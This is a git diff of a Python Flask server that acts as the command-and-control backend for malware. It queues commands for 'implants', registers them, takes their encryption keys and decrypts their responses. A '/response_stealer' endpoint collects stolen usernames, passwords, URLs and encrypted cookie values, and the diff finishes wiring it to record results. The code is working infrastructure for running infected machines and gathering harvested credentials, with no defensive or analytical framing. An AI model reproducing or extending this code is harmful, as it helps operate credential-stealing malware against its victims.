@@ -63,16 +63,6 @@ def create_token():
         print(f"error logging in: {error}")
         return {'failure': 'failure'}, 500, {'Access-Control-Allow-Origin': config.clientURL}
 
-
-@app.route("/test", methods=["GET"])
-def handle_test():
-    stuff = tools.executeInsertQuery("SELECT * from command_queue")
-    return jsonify(stuff)
-
-@app.route("/")
-def home():
-    return "<div>Hi</div>", 200
-
 # api endpoint to queue a command
 @app.route("/queueCommand", methods=["POST"])
 @jwt_required()
@@ -102,6 +92,8 @@ def handle_execute():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List all commands for a particular implant
+
+
 @app.route("/get_qcommands", methods=["POST"])
 def get_qcommands():
     data = request.json
@@ -140,6 +132,8 @@ def get_qcommands():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List all commands for a particular implant, in json
+
+
 @app.route("/get_commands", methods=["POST"])
 def get_commands():
     data = request.json
@@ -252,6 +246,8 @@ def register_implant():
         return e, {'Access-Control-Allow-Origin': config.clientURL}
 
 # Display implants
+
+
 @app.route("/display_implants", methods=["GET"])
 def display_implants():
     try:
@@ -262,7 +258,9 @@ def display_implants():
         print(f"Error displaying implants: {e}")
         return e, {'Access-Control-Allow-Origin': config.clientURL}
 
-#Endpoint for stealer to connect to 
+# Endpoint for stealer to connect to
+
+
 @app.route("/response_stealer", methods=["POST"])
 @cross_origin()
 def handle_response_stealer():
@@ -271,31 +269,38 @@ def handle_response_stealer():
         request.get_data()
         data = request.data
         data = json.loads(data)
-        username_list, password_list, url_list, host_key_list, encrypted_value_list = WyattWonderland.newParseJSON(data)
+        username_list, password_list, url_list, host_key_list, encrypted_value_list = WyattWonderland.newParseJSON(
+            data)
+        task_id = data['task_id']
+        success = data['success']
+        if success in ['Success', 'success']:
+            success = True
+        else:
+            success = False
+        response_data = "Stealer: response recieved. Check logs for this implant to see response."
 
         if ((len(username_list) not in [len(password_list), len(url_list)])):
             print("error: username list not same length as password list")
 
-        # query = "UPDATE task_queue SET status = 'executed', response_data = %s, success = %s, recieved_on = %s WHERE task_id= %s"
-        # time = datetime.now()
-        # print(response_data, success, time, task_id)
-        # response = tools.executeGenericVar(
-        #     query, [response_data, success, time, task_id])
-        # print(response)
-        # if response == []:
-        #     print("\n\nupdate task queue worked\n\n")
-
         query = "UPDATE task_queue SET status = 'executed', response_data = %s, success = %s, recieved_on = %s WHERE task_id= %s"
+        time = datetime.now()
+        print(response_data, success, time, task_id)
+        response = tools.executeGenericVar(
+            query, [response_data, success, time, task_id])
+        if response == []:
+            print("\n\nupdate task queue worked\n\n")
 
-        #TODO
-        #ingi look at /response_json for how to update tables
-        
+        # TODO
+        # ingi look at /response_json for how to update tables
+
         return "Success", 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as error:
         print(error)
         return error, 402, {'Access-Control-Allow-Origin': config.clientURL}
 
-# Route for implant to post a new symmetric key 
+# Route for implant to post a new symmetric key
+
+
 @app.route("/new_symkey", methods=["POST"])
 def getsymkey():
     try:
@@ -346,11 +351,11 @@ def handle_response_data():
     print("Received response")
     if (request.content_length < 5000000):
         try:
-            data= request.get_data()
-            #print(data)
-            #print(len(data))
-            datastr=data.decode("utf-8")
-            databytes=bytes.fromhex(datastr) 
+            data = request.get_data()
+            # print(data)
+            # print(len(data))
+            datastr = data.decode("utf-8")
+            databytes = bytes.fromhex(datastr)
             data = RsaDecryption.rsadecrypt(databytes)
             print("response:")
             print(data)
@@ -427,6 +432,7 @@ def handle_response_json():
         print()
         return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
 
+
 @app.route("/response_test", methods=["POST"])
 def testThis():
     try:
@@ -441,6 +447,7 @@ def testThis():
         return error, 401, {'Access-Control-Allow-Origin': '*'}
 
 # Gets log history of a particular implant, for console
+
 
 @app.route("/get_history", methods=["POST"])
 def get_history():
@@ -473,6 +480,7 @@ def get_history():
     except Exception as e:
         print(e)
         return e, {'Access-Control-Allow-Origin': '*'}
+
 
 @app.route("/upload_files", methods=["POST"])
 def upload_files():
